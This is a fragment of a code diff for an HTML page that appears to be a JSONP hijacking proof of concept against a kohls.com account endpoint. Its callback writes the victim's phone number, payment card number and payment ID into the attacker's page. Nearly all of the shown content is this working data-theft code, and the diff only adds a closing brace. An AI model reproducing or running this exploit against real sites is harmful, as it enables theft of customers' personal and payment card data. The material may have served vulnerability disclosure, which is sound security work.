@@ -10,7 +10,7 @@ document.getElementById('data1').innerHTML=document.getElementById('data1').inne
 document.getElementById('data1').innerHTML=document.getElementById('data1').innerHTML+'<br>'+'Customer Phone Number: '+Object.values(data.payload.profile.billAddress.phoneNumber);
 document.getElementById('data1').innerHTML=document.getElementById('data1').innerHTML+'<br>'+'Customer Card Info: '+Object.values(data.payload.profile.paymentTypes[0].cardNum);
 document.getElementById('data1').innerHTML=document.getElementById('data1').innerHTML+'<br>'+'Customer Card Info: '+Object.values(data.payload.profile.paymentTypes[0].ID);
-
+}
 </script>
 <script src='https://www.kohls.com/myaccount/json/myinfo/customer_saleAlerts_details_json.jsp?callback=myCallback'></script>
 
